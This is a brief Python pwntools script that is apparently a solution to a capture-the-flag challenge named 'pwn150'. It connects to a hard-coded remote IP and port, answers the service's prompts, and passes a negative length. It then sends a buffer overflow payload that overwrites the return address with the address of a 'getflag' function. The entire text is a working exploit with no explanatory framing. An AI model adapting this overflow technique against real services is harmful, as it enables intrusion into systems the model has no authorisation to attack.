from pwn import *


#r = process("./pwn150")

getflag = 0x000104d8
r = remote("165.227.98.55",2223)

def exploit(pld):
	
	r.recvuntil("name?")
	r.sendline("PWNY")
	r.recvuntil("Y or N:")
	r.sendline("Y")
	r.recvuntil("message:")
	r.sendline("-1")
	r.sendline(pld)
	return r.recvall()


payload = "AAAA"*130
payload += "BBBBCCCDDDDD"
payload += p32(getflag)

data = exploit(payload)
print data
